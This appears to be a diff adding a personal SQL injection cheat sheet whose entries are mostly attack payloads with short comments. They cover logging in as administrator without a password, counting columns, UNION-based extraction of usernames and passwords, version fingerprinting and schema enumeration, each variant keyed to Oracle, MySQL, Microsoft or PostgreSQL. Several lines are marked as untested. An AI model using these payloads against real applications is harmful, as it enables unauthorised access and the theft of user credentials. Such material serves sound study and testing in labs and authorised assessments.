@@ -1,0 +1,48 @@
+SQL Injection by TheParmak,
+
+*SQL injection is like lockpicking you gotta twist and turn and flip and flop to get it working.*
+	*-Some Kind of Potato SkyWalker*
+
+
+#gathering all tables
+	' OR 1=1 -- a
+
+#loging in as administrator user
+	admninistrator'--
+
+#trying to guess column number
+	' ORDER BY 3 -- a
+
+#trying to guess column number with UNION SELECT
+	' UNION SELECT NULL,NULL,NULL -- a 				#non-Oracle databases
+	' UNION SELECT NULL,NULL,NULL FROM dual -- a 	#only Oracle databases
+
+#trying to guess the string column
+	' UNION SELECT 'string',NULL,NULL,NULL -- a
+	' UNION SELECT NULL,'string',NULL,NULL -- a
+	' UNION SELECT NULL,NULL,'string',NULL -- a
+	' UNION SELECT NULL,NULL,NULL,'string' -- a
+
+#gathering interesting data
+	' UNION SELECT username, password FROM users -- a
+
+#gathering interesting data in a single column
+	' UNION SELECT username || ':' || password FROM users -- a 			#Oracle and PostgreSQL //needs to be tested
+	' UNION SELECT username + ':' + password FROM users -- a 			#Micrososft //needs to be tested
+	' UNION SELECT NULL,concat(username,':',password) FROM users -- a 	#MySQL
+
+#gathering database version information //NULL's maybe needed
+	' UNION SELECT BANNER FROM v$version -- a 			#Oracle
+	' UNION SELECT @@version -- a   					#MySQL and Micrososft
+	' UNION SELECT version() -- a 						#PostgreSQL //needs to be tested
+
+#gathering information about the database //non-Oracle databases
+	' UNION SELECT table_schema, table_name FROM information_schema.tables -- a
+	' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = put_table_name_here -- a
+	' UNION SELECT put_column_name_here, put_column_name_here FROM put_database_name_here.put_table_name_here -- a
+ 
+#gathering information about the database //only Oracle databases
+	' UNION SELECT table_name FROM all_tables -- a
+	' UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'put_table_name_here' -- a
+	' UNION SELECT put_column_name_here, put_column_name_here FROM put_table_name_here -- a
+	
